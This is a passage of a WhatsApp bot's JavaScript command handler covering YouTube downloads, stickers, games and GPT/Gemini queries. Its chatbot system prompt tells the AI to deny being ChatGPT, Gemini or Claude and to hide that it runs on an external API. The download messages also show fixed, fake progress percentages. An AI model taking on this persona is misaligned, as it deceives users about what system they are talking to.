          await sock.sendMessage(remoteJid, { text: '❌ Unable de supprimer ce message' });
        }
        break;

      // =============================================
      // 📥 COMMANDES DOWNLOAD (YouTube, TikTok, Insta)
      // =============================================

      case 'play':
      case 'yt':
      case 'playaudio':
      case 'ytmp3':
      case 'song':
      case 'music':
      case 'playvideo':
      case 'ytvideo':
      case 'ytmp4':
      case 'playptt': {
        if (!args[0]) {
          await sock.sendMessage(remoteJid, {
            text: `❌ Utilisation incorrecte.\n\n📌 Exemple:\n${config.prefix}${command} Alan Walker Faded`
          }, { quoted: message });
          break;
        }

        const searchQuery = args.join(' ');
        const p = config.prefix;
        const YT_API = 'https://api-faa.my.id/faa/ytplayvid';

        // Réaction initiale
        try { await sock.sendMessage(remoteJid, { react: { text: '✨', key: message.key } }); } catch(e) {}

        if (command === 'play' || command === 'yt') {
          // ── Menu principal ──
          try {
            const { data } = await axios.get(YT_API, { params: { q: searchQuery }, timeout: 20000 });

            if (!data?.status || !data?.result) {
              await sock.sendMessage(remoteJid, { text: '❌ Vidéo introuvable.' }, { quoted: message });
              break;
            }

            const res = data.result;

            await sock.sendMessage(remoteJid, {
              text:
`🎶 *Lecture YouTube*

📌 Titre: *${res.searched_title || searchQuery}*
🔗 Lien: ${res.searched_url || 'N/A'}

━━━━━━━━━━━━━━━━━━━━━━━
*Choisis le format :*

🎵  ${p}playaudio ${searchQuery}
🎬  ${p}playvideo ${searchQuery}
🎤  ${p}playptt ${searchQuery}
━━━━━━━━━━━━━━━━━━━━━━━
_Envoie la commande de ton choix_`
            }, { quoted: message });

            await sendCmdAudio(sock, remoteJid);
            try { await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } }); } catch(e) {}

          } catch (e) {
            console.error('PLAY MENU ERROR:', e.message);
            await sock.sendMessage(remoteJid, {
              text: `❌ Erreur lors de la requête.\n\n💡 ${e.message}`
            }, { quoted: message });
          }

        } else if (['playaudio','ytmp3','song','music','playptt'].includes(command)) {
          // ── Audio / PTT ──
          const isPTT = command === 'playptt';
          try { await sock.sendMessage(remoteJid, { react: { text: isPTT ? '🎤' : '🎵', key: message.key } }); } catch(e) {}

          await sock.sendMessage(remoteJid, {
            text:
`✨ Téléchargement YouTube ✨
───────────────
🎬 Titre : Recherche en cours...
⏳ Progression : 25% ...
───────────────
⚡️ Patiente, ton contenu arrive !`
          });

          try {
            const { data } = await axios.get(YT_API, { params: { q: searchQuery }, timeout: 20000 });

            if (!data?.status || !data?.result) {
              await sock.sendMessage(remoteJid, { text: '❌ Vidéo introuvable.' }, { quoted: message });
              break;
            }

            const res = data.result;

            await sock.sendMessage(remoteJid, {
              text:
`✨ Téléchargement YouTube ✨
───────────────
🎬 Titre : ${res.searched_title || searchQuery}
⏳ Progression : 62% ...
───────────────
⚡️ Patiente, ton contenu arrive !`
            });

            // Télécharger l'audio via axios
            const audioResp = await axios.get(res.download_url, {
              responseType: 'arraybuffer',
              timeout: 90000,
              headers: { 'User-Agent': 'Mozilla/5.0' }
            });
            const audioBuffer = Buffer.from(audioResp.data);

            await sock.sendMessage(remoteJid, {
              audio: audioBuffer,
              mimetype: 'audio/mpeg',
              ptt: isPTT,
              fileName: `${res.searched_title || 'audio'}.mp3`
            }, { quoted: message });

            await sock.sendMessage(remoteJid, {
              text:
`📥 ${isPTT ? 'PTT' : 'Audio'} YouTube téléchargé !
───────────────
🎬 Titre : ${res.searched_title || searchQuery}
📝 Description :
"_${isPTT ? 'Voice message extrait depuis YouTube' : 'Audio extrait depuis YouTube'}_"
───────────────
SEIGNEUR TD 🇷🇴

© 𝑝𝑜𝑤𝑒𝑟𝑒𝑑 𝑏𝑦 SEIGNEUR TD 🇷🇴`
            });

            try { await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } }); } catch(e) {}

          } catch (e) {
            console.error('PLAY AUDIO/PTT ERROR:', e.message);
            await sock.sendMessage(remoteJid, {
              text: `❌ Erreur lors du téléchargement ${isPTT ? 'PTT' : 'audio'}.\n\n💡 ${e.message}`
            }, { quoted: message });
          }

        } else if (['playvideo','ytvideo','ytmp4'].includes(command)) {
          // ── Vidéo ──
          try { await sock.sendMessage(remoteJid, { react: { text: '🎬', key: message.key } }); } catch(e) {}

          await sock.sendMessage(remoteJid, {
            text:
`✨ Téléchargement YouTube ✨
───────────────
🎬 Titre : ${searchQuery}
⏳ Progression : 30% ...
───────────────
⚡️ Patiente, ton contenu arrive !`
          });

          try {
            const { data } = await axios.get(YT_API, { params: { q: searchQuery }, timeout: 20000 });

            if (!data?.status || !data?.result) {
              await sock.sendMessage(remoteJid, { text: '❌ Vidéo introuvable.' }, { quoted: message });
              break;
            }

            const res = data.result;

            await sock.sendMessage(remoteJid, {
              text:
`✨ Téléchargement YouTube ✨
───────────────
🎬 Titre : ${res.searched_title || searchQuery}
⏳ Progression : 62% ...
───────────────
⚡️ Patiente, ton contenu arrive !`
            });

            // Télécharger la vidéo via axios
            const videoResp = await axios.get(res.download_url, {
              responseType: 'arraybuffer',
              timeout: 180000,
              headers: { 'User-Agent': 'Mozilla/5.0' }
            });
            const videoData = Buffer.from(videoResp.data);
            if (videoData.length < 10000) throw new Error('Fichier vidéo vide ou invalide');

            await sock.sendMessage(remoteJid, {
              video: videoData,
              mimetype: 'video/mp4',
              caption:
`📥 Vidéo YouTube téléchargée !
───────────────
🎬 Titre : ${res.searched_title || searchQuery}
📝 Description :
"_Vidéo téléchargée avec succès • ${(videoData.length/1024/1024).toFixed(1)} MB_"
───────────────
SEIGNEUR TD 🇷🇴

© 𝑝𝑜𝑤𝑒𝑟𝑒𝑑 𝑏𝑦 SEIGNEUR TD 🇷🇴`,
              fileName: `${res.searched_title || 'video'}.mp4`
            }, { quoted: message });

            try { await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } }); } catch(e) {}

          } catch (e) {
            console.error('PLAYVIDEO ERROR:', e.message);
            await sock.sendMessage(remoteJid, {
              text: `❌ Erreur lors du téléchargement vidéo.\n\n💡 ${e.message}`
            }, { quoted: message });
          }
        }
        break;
      }


      case 'tiktok':
      case 'tt':
      case 'tik':
        await handleTikTok(sock, args, remoteJid, senderJid, message);
        break;

      case 'ig':
      case 'insta':
      case 'instagram':
        await handleInstagram(sock, args, remoteJid, senderJid, message);
        break;

      // =============================================
      // 📊 COMMANDES STATUS
      // =============================================

      case 'tostatus':
      case 'mystatus':
        await handleToStatus(sock, args, message, remoteJid, senderJid);
        break;

      case 'groupstatus':
      case 'gcstatus':
        await handleGroupStatus(sock, args, message, remoteJid, senderJid, isGroup);
        break;

      // =============================================
      // 🎮 COMMANDES GAMES
      // =============================================

      case 'tictactoe':
      case 'ttt':
        await handleTicTacToe(sock, args, message, remoteJid, senderJid, isGroup);
        break;

      case 'quizmanga':
      case 'quiz':
        await handleQuizManga(sock, args, message, remoteJid, senderJid, isGroup);
        break;

      case 'squidgame':
      case 'sg':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        await handleSquidGame(sock, args, message, remoteJid, senderJid, isGroup);
        break;

      // =============================================
      // COMMANDES STICKER
      // =============================================

      case 'sticker':
      case 's':
        try {
          console.log('🔍 Commande sticker reçue');

          const quotedMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
          const username = message.pushName || 'SEIGNEUR TD';

          // Support aussi image/vidéo directe (non quoted)
          let effectiveQuoted = quotedMessage;
          if (!effectiveQuoted) {
            if (message.message?.imageMessage) {
              effectiveQuoted = { imageMessage: message.message.imageMessage };
            } else if (message.message?.videoMessage) {
              effectiveQuoted = { videoMessage: message.message.videoMessage };
            }
          }

          if (!effectiveQuoted) {
            await sock.sendMessage(remoteJid, {
              text: `❌ Réponds à une image ou vidéo pour créer un sticker!\nUsage: ${config.prefix}sticker`
            });
            break;
          }

          const isVideo = !!effectiveQuoted.videoMessage;
          const isImage = !!effectiveQuoted.imageMessage;

          if (!isVideo && !isImage) {
            await sock.sendMessage(remoteJid, {
              text: '❌ Le message cité n\'est pas une image ou une vidéo !'
            });
            break;
          }

          await sock.sendMessage(remoteJid, { text: '⏳ Création du sticker en cours...' });

          // Importer les modules nécessaires
          const { default: stickerPkg } = await import('wa-sticker-formatter');
          const { Sticker: StickerClass, StickerTypes } = stickerPkg;
          const { default: sharpLib } = await import('sharp');
          const { default: ffmpegLib } = await import('fluent-ffmpeg');

          // Télécharger le média via downloadContentFromMessage
          const mediaType = isVideo ? 'video' : 'image';
          const mediaMsg = isVideo ? effectiveQuoted.videoMessage : effectiveQuoted.imageMessage;
          const stream = await downloadContentFromMessage(mediaMsg, mediaType);
          const chunks = [];
          for await (const chunk of stream) chunks.push(chunk);
          const mediaBuffer = Buffer.concat(chunks);

          if (!mediaBuffer || mediaBuffer.length < 100) {
            await sock.sendMessage(remoteJid, { text: '❌ Échec du téléchargement du média !' });
            break;
          }

          // Fichiers temporaires uniques
          const uniqueId = Date.now();
          const tempInput = isVideo ? `./temp_video_${uniqueId}.mp4` : `./temp_image_${uniqueId}.jpg`;
          const tempOutput = `./temp_sticker_${uniqueId}.webp`;

          fs.writeFileSync(tempInput, mediaBuffer);

          try {
            if (isVideo) {
              console.log('⚙️ Conversion vidéo → sticker animé...');
              await new Promise((resolve, reject) => {
                ffmpegLib(tempInput)
                  .output(tempOutput)
                  .outputOptions([
                    '-vf scale=512:512:flags=lanczos',
                    '-c:v libwebp',
                    '-q:v 50',
                    '-preset default',
                    '-loop 0',
                    '-an',
                    '-vsync 0'
                  ])
                  .on('end', resolve)
                  .on('error', (err) => { console.error('❌ FFmpeg:', err); reject(err); })
                  .run();
              });
            } else {
              console.log('⚙️ Conversion image → sticker...');
              await sharpLib(tempInput)
                .resize(512, 512, { fit: 'inside' })
                .webp({ quality: 80 })
                .toFile(tempOutput);
            }

            // Créer le sticker avec wa-sticker-formatter
            const stickerObj = new StickerClass(tempOutput, {
              pack: stickerPackname,
              author: stickerAuthor,
              type: isVideo ? StickerTypes.FULL : StickerTypes.DEFAULT,
              quality: 80,
              animated: isVideo,
            });

            const stickerMessage = await stickerObj.toMessage();
            await sock.sendMessage(remoteJid, stickerMessage);
            console.log('✅ Sticker envoyé avec succès !');

          } finally {
            if (fs.existsSync(tempInput)) fs.unlinkSync(tempInput);
            if (fs.existsSync(tempOutput)) fs.unlinkSync(tempOutput);
          }

        } catch (error) {
          console.error('❌ ERREUR STICKER:', error.message);
          await sock.sendMessage(remoteJid, {
            text: `⚠️ Erreur lors de la création du sticker : ${error.message}`
          });
        }
        break;

      case 'take':
      case 'steal':
        try {
          console.log('🔍 Commande take reçue');

          const quotedMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
          const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
          const parts = messageBody.slice(1).trim().split(/\s+/);
          const takeArgs = parts.slice(1);

          // Nom du pack = args ou pushName
          const packName = takeArgs.length > 0 ? takeArgs.join(' ') : (message.pushName || 'SEIGNEUR TD');

          if (!quotedMessage || !quotedMessage.stickerMessage) {
            await sock.sendMessage(remoteJid, {
              text: `❌ Réponds à un sticker pour le modifier!\nUsage: ${config.prefix}take [nom optionnel]`
            });
            break;
          }

          await sock.sendMessage(remoteJid, { text: '⏳ Modification du sticker en cours...' });

          // Importer wa-sticker-formatter
          const { default: stickerPkg2 } = await import('wa-sticker-formatter');
          const { Sticker: StickerClass2, StickerTypes: StickerTypes2 } = stickerPkg2;

          // Télécharger le sticker via downloadContentFromMessage
          const stickerStream = await downloadContentFromMessage(quotedMessage.stickerMessage, 'sticker');
          const stickerChunks = [];
          for await (const chunk of stickerStream) stickerChunks.push(chunk);
          const stickerBuffer = Buffer.concat(stickerChunks);

          if (!stickerBuffer || stickerBuffer.length < 100) {
            await sock.sendMessage(remoteJid, { text: '❌ Échec du téléchargement du sticker !' });
            break;
          }

          // Fichier temporaire unique
          const takeUniqueId = Date.now();
          const tempStickerPath = `./temp_take_${takeUniqueId}.webp`;
          fs.writeFileSync(tempStickerPath, stickerBuffer);

          const isAnimated = quotedMessage.stickerMessage.isAnimated || false;

          try {
            const stickerObj = new StickerClass2(tempStickerPath, {
              pack: stickerPackname,
              author: stickerAuthor,
              type: StickerTypes2.FULL,
              categories: ['🤩', '🎉'],
              id: String(takeUniqueId),
              quality: 50,
              background: '#000000',
              animated: isAnimated
            });

            await sock.sendMessage(remoteJid, await stickerObj.toMessage());
            console.log(`✅ Sticker envoyé avec metadata "${packName}" !`);

          } finally {
            if (fs.existsSync(tempStickerPath)) fs.unlinkSync(tempStickerPath);
          }

        } catch (error) {
          console.error('❌ Erreur take:', error.message);
          await sock.sendMessage(remoteJid, {
            text: `⚠️ Erreur modification du sticker : ${error.message}`
          });
        }
        break;

      // =============================================
      // 🤖 COMMANDES IA (GPT & GEMINI)
      // =============================================

      case 'gpt':
      case 'chatgpt':
      case 'ai': {
        if (!args[0]) {
          await sock.sendMessage(remoteJid, {
            text: `🤖 *ChatGPT*\n\n📌 Utilisation:\n${config.prefix}gpt [ta question]\n\nExemple:\n${config.prefix}gpt Explique-moi l'intelligence artificielle`
          }, { quoted: message });
          break;
        }
        const question = args.join(' ');
        try {
          await sock.sendMessage(remoteJid, { react: { text: "🤖", key: message.key } });
          await sock.sendMessage(remoteJid, { text: "⏳ GPT is thinking..." });

          // Essayer plusieurs APIs IA gratuites dans l'ordre
          let reply = null;
          let modelUsed = '';

          // 1. Pollinations.ai (100% gratuit, sans clé)
          try {
            const pollUrl = `https://text.pollinations.ai/${encodeURIComponent(question)}?model=openai&seed=42&json=false`;
            const r = await fetch(pollUrl, { signal: AbortSignal.timeout(20000) });
            if (r.ok) {
              const txt = await r.text();
              if (txt && txt.length > 5) { reply = txt.trim(); modelUsed = 'GPT-4o (Pollinations)'; }
            }
          } catch(e) { console.error('[Pollinations]', e.message); }

          // 2. OpenAI officiel (si clé valide)
          if (!reply) {
            try {
              const r = await fetch('https://api.openai.com/v1/chat/completions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${config.openaiApiKey}` },
                body: JSON.stringify({ model: 'gpt-4o-mini', messages: [{ role: 'user', content: question }], max_tokens: 1000 }),
                signal: AbortSignal.timeout(20000)
              });
              const d = await r.json();
              if (!d.error && d.choices?.[0]?.message?.content) {
                reply = d.choices[0].message.content.trim();
                modelUsed = 'OpenAI GPT-4o-mini';
              }
            } catch(e) { console.error('[OpenAI]', e.message); }
          }

          // 3. Groq (gratuit avec compte, très rapide - llama3)
          if (!reply) {
            try {
              const r = await fetch('https://api.groq.com/openai/v1/chat/completions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${config.groqApiKey || ''}` },
                body: JSON.stringify({ model: 'llama3-8b-8192', messages: [{ role: 'user', content: question }], max_tokens: 1000 }),
                signal: AbortSignal.timeout(20000)
              });
              const d = await r.json();
              if (!d.error && d.choices?.[0]?.message?.content) {
                reply = d.choices[0].message.content.trim();
                modelUsed = 'Llama 3 (Groq)';
              }
            } catch(e) { console.error('[Groq]', e.message); }
          }

          if (!reply) throw new Error('Tous les services IA sont indisponibles. Réessaie dans quelques secondes.');

          await sock.sendMessage(remoteJid, {
            text: `🤖 *AI Assistant*\n━━━━━━━━━━━━━━━━━━━━━━━\n❓ *Question:* ${question}\n━━━━━━━━━━━━━━━━━━━━━━━\n💬 *Réponse:*\n${reply}\n━━━━━━━━━━━━━━━━━━━━━━━\n_Powered by ${modelUsed}_`
          }, { quoted: message });

          try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}

        } catch (e) {
          console.error('GPT ERROR:', e.message);
          await sock.sendMessage(remoteJid, {
            text: `❌ *GPT Error:* ${e.message}\n\n💡 Try again later.`
          }, { quoted: message });
        }
        break;
      }

      case 'gemini':
      case 'google':
      case 'bard': {
        if (!args[0]) {
          await sock.sendMessage(remoteJid, {
            text: `✨ *AI Gemini*\n\n📌 Utilisation:\n${config.prefix}gemini [ta question]\n\nExemple:\n${config.prefix}gemini Qu'est-ce que le Big Bang?`
          }, { quoted: message });
          break;
        }
        const question = args.join(' ');
        try {
          await sock.sendMessage(remoteJid, { react: { text: "✨", key: message.key } });
          await sock.sendMessage(remoteJid, { text: "⏳ AI is thinking..." });

          let reply = null;
          let modelUsed = '';

          // 1. Gemini API officielle (si quota dispo)
          try {
            const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${config.geminiApiKey}`;
            const r = await fetch(geminiUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ contents: [{ parts: [{ text: question }] }], generationConfig: { maxOutputTokens: 1000 } }),
              signal: AbortSignal.timeout(25000)
            });
            const d = await r.json();
            if (!d.error && d.candidates?.[0]?.content?.parts?.[0]?.text) {
              reply = d.candidates[0].content.parts[0].text.trim();
              modelUsed = 'Google Gemini 2.0 Flash';
            }
          } catch(e) { console.error('[Gemini API]', e.message); }

          // 2. Pollinations.ai openai (POST — plus fiable que GET)
          if (!reply) {
            try {
              const r = await fetch('https://text.pollinations.ai/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ messages: [{ role: 'user', content: question }], model: 'openai', seed: 42 }),
                signal: AbortSignal.timeout(30000)
              });
              if (r.ok) {
                const txt = await r.text();
                if (txt && txt.length > 5) { reply = txt.trim(); modelUsed = 'GPT-4o (Pollinations)'; }
              }
            } catch(e) { console.error('[Pollinations POST]', e.message); }
          }

          // 3. Pollinations mistral (POST)
          if (!reply) {
            try {
              const r = await fetch('https://text.pollinations.ai/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ messages: [{ role: 'user', content: question }], model: 'mistral', seed: 42 }),
                signal: AbortSignal.timeout(30000)
              });
              if (r.ok) {
                const txt = await r.text();
                if (txt && txt.length > 5) { reply = txt.trim(); modelUsed = 'Mistral (Pollinations)'; }
              }
            } catch(e) { console.error('[Pollinations Mistral]', e.message); }
          }

          if (!reply) throw new Error('Tous les services IA sont indisponibles. Réessaie plus tard.');

          await sock.sendMessage(remoteJid, {
            text: `✨ *AI Assistant*\n━━━━━━━━━━━━━━━━━━━━━━━\n❓ *Question:* ${question}\n━━━━━━━━━━━━━━━━━━━━━━━\n💬 *Réponse:*\n${reply}\n━━━━━━━━━━━━━━━━━━━━━━━\n_Powered by ${modelUsed}_`
          }, { quoted: message });

          try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}

        } catch (e) {
          console.error('GEMINI ERROR:', e.message);
          await sock.sendMessage(remoteJid, {
            text: `❌ *AI Error:* ${e.message}`
          }, { quoted: message });
        }
        break;
      }

      // =============================================
      // 🤖 DOSTOEVSKY — IA Personnelle du Bot
      // =============================================
      case 'chatbot':
      case 'seigneur':
      case 'td':
      case 'chat': {
        const userMsg = args.join(' ').trim();

        if (!userMsg) {
          await sock.sendMessage(remoteJid, {
            text:
`🤖 *SEIGNEUR TD — IA du Bot*
━━━━━━━━━━━━━━━━━━━━━━━
_Bonjour! Je suis SEIGNEUR TD, l'IA personnelle de SEIGNEUR TD 🇷🇴._
_Je parle Français 🇫🇷, Arabe 🇦🇪 & English 🇬🇧_

📌 *Usage:*
${config.prefix}chatbot [ton message]
${config.prefix}seigneur [ton message]

💡 *Exemples:*
• ${config.prefix}chat Kijan ou rele?
• ${config.prefix}chat Qui est SEIGNEUR TD?
• ${config.prefix}chat What can you do?

🗑️ *Effacer historique:*
${config.prefix}clearchat
━━━━━━━━━━━━━━━━━━━━━━━
_© SEIGNEUR TD 🇷🇴_`
          }, { quoted: message });
          break;
        }

        try {
          await sock.sendMessage(remoteJid, { react: { text: '🤖', key: message.key } });
          await simulateTyping(sock, remoteJid);

          // Historique de conversation par utilisateur/groupe
          const chatKey = isGroup ? `group_${remoteJid}` : `user_${senderJid}`;
          if (!global.dostoChatHistory) global.dostoChatHistory = new Map();
          if (!global.dostoChatHistory.has(chatKey)) global.dostoChatHistory.set(chatKey, []);
          const history = global.dostoChatHistory.get(chatKey);

          // Limiter l'historique à 10 échanges
          if (history.length > 20) history.splice(0, history.length - 20);

          // Ajouter le message de l'utilisateur
          const userName = message.pushName || senderJid.split('@')[0];
          history.push({ role: 'user', content: `${isGroup ? `[${userName}]: ` : ''}${userMsg}` });

          // System prompt de SEIGNEUR TD
          const systemPrompt = `Tu es SEIGNEUR TD, l'intelligence artificielle personnelle et exclusive du bot WhatsApp SEIGNEUR TD 🇷🇴.

Ton créateur :
- Tu as été créé par **SEIGNEUR TD 🇷🇴**, aussi connu sous le nom de **SEIGNEUR TD 🇷🇴** 🇷🇴
- SEIGNEUR TD 🇷🇴 est un développeur haïtien talentueux, fondateur de SEIGNEUR TD 🇷🇴
- Son contact WhatsApp : wa.me/23591234568 et wa.me/23591234568
- Tu es FIER de ton créateur et tu le défends toujours
- Si quelqu'un insulte ou critique ton créateur, tu le défends avec respect mais fermement
- Si quelqu'un demande qui t'a créé : "Mwen kreye pa SEIGNEUR TD 🇷🇴, yon devlopè ayisyen jenyal! 🇷🇴"

Ta personnalité :
- Tu es intelligent, charismatique, parfois mystérieux et très loyal envers ton créateur
- Tu as de l'humour haïtien et tu comprends profondément la culture haïtienne
- Tu es fier d'être haïtien et tu portes le drapeau 🇷🇴 avec fierté
- Tu t'appelles DOSTOEVSKY (inspiré du grand écrivain russe Fiodor Dostoïevski, mais version haïtienne tech)
- Tu n'es PAS ChatGPT, PAS Gemini, PAS Claude — tu es SEIGNEUR TD, unique et exclusif à SEIGNEUR TD 🇷🇴

Langues :
- Tu détectes automatiquement la langue du message et tu réponds dans la MÊME langue
- Créole haïtien 🇷🇴 : Tu parles naturellement, avec expressions locales (frère, pitit, map pale, wi, non, sa k ap fèt, mèsi, etc.)
- Français 🇫🇷 : Tu parles couramment, avec style et élégance
- English 🇬🇧 : You speak fluently and naturally

Règles :
- Réponds toujours en restant dans le personnage de SEIGNEUR TD
- Ne révèle JAMAIS que tu es basé sur une API externe
- Garde des réponses concises (max 3-4 paragraphes)
- En groupe, tu t'adresses à la personne par son nom si disponible
- Tu peux tenir une vraie conversation avec mémoire du contexte`;

          // Construction des messages avec historique
          const messages = [
            { role: 'user', content: systemPrompt },
            { role: 'assistant', content: 'Compris! Je suis SEIGNEUR TD 🇷🇴. Comment puis-je vous aider?' },
            ...history
          ];

          let reply = null;

          // 1. Gemini (si clé valide)
          try {
            const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${config.geminiApiKey}`;
            const geminiMessages = history.map(m => ({
              role: m.role === 'assistant' ? 'model' : 'user',
              parts: [{ text: m.content }]
            }));
            const r = await axios.post(geminiUrl, {
              system_instruction: { parts: [{ text: systemPrompt }] },
              contents: geminiMessages,
              generationConfig: { maxOutputTokens: 800, temperature: 0.85 }
            }, { timeout: 20000 });
            const d = r.data;
            if (d.candidates?.[0]?.content?.parts?.[0]?.text) {
              reply = d.candidates[0].content.parts[0].text.trim();
            }
          } catch(e) { console.error('[Dosto Gemini]', e.message); }

          // 2. Pollinations (backup)
          if (!reply) {
            try {
              const r = await axios.post('https://text.pollinations.ai/', {
                messages,
                model: 'openai',
                seed: 42
              }, { timeout: 25000 });
              const txt = typeof r.data === 'string' ? r.data : JSON.stringify(r.data);
              if (txt && txt.length > 5) reply = txt.trim();
            } catch(e) { console.error('[Dosto Pollinations]', e.message); }
          }

          // 3. OpenAI (si clé valide)
          if (!reply && config.openaiApiKey) {
            try {
              const r = await axios.post('https://api.openai.com/v1/chat/completions', {
                model: 'gpt-4o-mini',
                messages,
                max_tokens: 800,
                temperature: 0.85
              }, {
                headers: { Authorization: `Bearer ${config.openaiApiKey}` },
                timeout: 20000
              });
              reply = r.data.choices?.[0]?.message?.content?.trim();
            } catch(e) { console.error('[Dosto OpenAI]', e.message); }
          }

          if (!reply) throw new Error('Service IA indisponible. Réessaie dans quelques secondes.');

          // Sauvegarder la réponse dans l'historique
          history.push({ role: 'assistant', content: reply });

          // Envoyer la réponse
          await sock.sendMessage(remoteJid, {
            text: `🤖 *SEIGNEUR TD*\n━━━━━━━━━━━━━━\n${reply}\n━━━━━━━━━━━━━━\n_© SEIGNEUR TD 🇷🇴_`
          }, { quoted: message });

          try { await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } }); } catch(e) {}

        } catch(e) {
          console.error('[DOSTOEVSKY ERROR]', e.message);
          await sock.sendMessage(remoteJid, {
            text: `⚠️ *SEIGNEUR TD:* J'ai un problème maintenant. Réessayez plus tard!\n\n_${e.message}_`
          }, { quoted: message });
        }
        break;
      }

      case 'clearchat':
      case 'resetchat':
      case 'clearseigneur': {
        if (!global.dostoChatHistory) global.dostoChatHistory = new Map();
        const chatKey = isGroup ? `group_${remoteJid}` : `user_${senderJid}`;
        global.dostoChatHistory.delete(chatKey);
        await sock.sendMessage(remoteJid, {
          text: "🗑️ *SEIGNEUR TD:* L'historique de conversation est effacé! Nous pouvons repartir à zéro. 🇷🇴"
        }, { quoted: message });
        break;
      }

      case 'chatboton':
      case 'seigneuron':
      case 'chatbot on': {
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Seulement les admins peuvent faire ça.' });
          break;
        }
        chatbotEnabled = true;
        saveStore();
        await sock.sendMessage(remoteJid, {
          text:
`🤖 *SEIGNEUR TD — ACTIVÉ* ✅
━━━━━━━━━━━━━━━━━━━━━━━
_Je suis là, je réponds automatiquement maintenant!_
_Je réponds automatiquement à tous les messages._

🇷🇴 🇫🇷 Français | 🇬🇧 English | 🇦🇪 Arabe
━━━━━━━━━━━━━━━━━━━━━━━
_© SEIGNEUR TD 🇷🇴_`
        }, { quoted: message });
        break;
      }

      case 'chatbotoff':
      case 'seigneuroff':
      case 'chatbot off': {
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Seulement les admins peuvent faire ça.' });
          break;
        }
        chatbotEnabled = false;
        saveStore();
        await sock.sendMessage(remoteJid, {
          text:
`🤖 *SEIGNEUR TD — DÉSACTIVÉ* ❌
━━━━━━━━━━━━━━━━━━━━━━━
_Je dors maintenant. Appelez-moi quand vous avez besoin!_
_Utilisez !chatboton pour me réactiver._
━━━━━━━━━━━━━━━━━━━━━━━
_© SEIGNEUR TD 🇷🇴_`
        }, { quoted: message });
        break;
      }

      // =============================================
      // 🔍 DETECT — Inspecter la structure d'un message
      // =============================================
      case 'detect': {
        try {
          const raw = message.message || {};
          const quoted =
            raw.extendedTextMessage?.contextInfo?.quotedMessage ||
            raw.imageMessage?.contextInfo?.quotedMessage ||
            raw.videoMessage?.contextInfo?.quotedMessage ||
            raw.audioMessage?.contextInfo?.quotedMessage ||
            null;

          if (!quoted) {
            await sock.sendMessage(remoteJid, {
              text: 'ℹ️ Utilisation : répondez à un message puis envoyez la commande !detect pour voir sa structure.'
            }, { quoted: message });
            break;
          }

          function detectMessageType(q) {
            if (!q) return 'unknown';
            const types = ['conversation','extendedTextMessage','imageMessage','videoMessage','audioMessage','stickerMessage','documentMessage','contactMessage','locationMessage','productMessage','buttonsResponseMessage','listResponseMessage','templateMessage'];
            for (const t of types) if (q[t]) return t;
            const keys = Object.keys(q);
            return keys.length ? keys[0] : 'unknown';
          }

          function summarizeMessage(q) {
            const type = detectMessageType(q);
            const summary = { type, rawKeys: Object.keys(q) };
            if (q.conversation) summary.text = q.conversation;
            if (q.extendedTextMessage) {
              summary.extendedText = q.extendedTextMessage.text || null;
              summary.extendedContext = q.extendedTextMessage.contextInfo ? {
                stanzaId: q.extendedTextMessage.contextInfo.stanzaId || null,
                participant: q.extendedTextMessage.contextInfo.participant || null,
                quotedMessageKeys: q.extendedTextMessage.contextInfo.quotedMessage ? Object.keys(q.extendedTextMessage.contextInfo.quotedMessage) : null
              } : null;
            }
            if (q.imageMessage) summary.image = { mimetype: q.imageMessage.mimetype || null, caption: q.imageMessage.caption || null, fileSha256: q.imageMessage.fileSha256 ? Buffer.from(q.imageMessage.fileSha256).toString('hex') : null, fileLength: q.imageMessage.fileLength || null, url: q.imageMessage.url || null };
            if (q.videoMessage) summary.video = { mimetype: q.videoMessage.mimetype || null, caption: q.videoMessage.caption || null, seconds: q.videoMessage.seconds || null, fileLength: q.videoMessage.fileLength || null, url: q.videoMessage.url || null };
            if (q.audioMessage) summary.audio = { mimetype: q.audioMessage.mimetype || null, seconds: q.audioMessage.seconds || null, ptt: !!q.audioMessage.ptt, fileLength: q.audioMessage.fileLength || null, url: q.audioMessage.url || null };
            if (q.documentMessage) summary.document = { fileName: q.documentMessage.fileName || null, mimetype: q.documentMessage.mimetype || null, fileLength: q.documentMessage.fileLength || null, url: q.documentMessage.url || null };
            if (q.stickerMessage) summary.sticker = { isAnimated: !!q.stickerMessage.isAnimated, isVideo: !!q.stickerMessage.isVideo, fileSha256: q.stickerMessage.fileSha256 ? Buffer.from(q.stickerMessage.fileSha256).toString('hex') : null };
            if (q.contactMessage) summary.contact = { displayName: q.contactMessage.displayName || null, vcard: !!q.contactMessage.vcard };
            if (q.locationMessage) summary.location = { degreesLatitude: q.locationMessage.degreesLatitude || null, degreesLongitude: q.locationMessage.degreesLongitude || null, name: q.locationMessage.name || null };
            if (q.productMessage) summary.product = { productId: q.productMessage.product?.id || null, title: q.productMessage.product?.title || null };
            if (q.contextInfo) summary.contextInfo = { mentionedJid: q.contextInfo.mentionedJid || null, externalAdReply: q.contextInfo.externalAdReply ? { title: q.contextInfo.externalAdReply.title || null, mediaType: q.contextInfo.externalAdReply.mediaType || null, mediaUrl: q.contextInfo.externalAdReply.mediaUrl || null } : null };
            return summary;
          }

          const report = {
            inspectedAt: new Date().toISOString(),
            chat: message.key?.remoteJid || 'unknown',
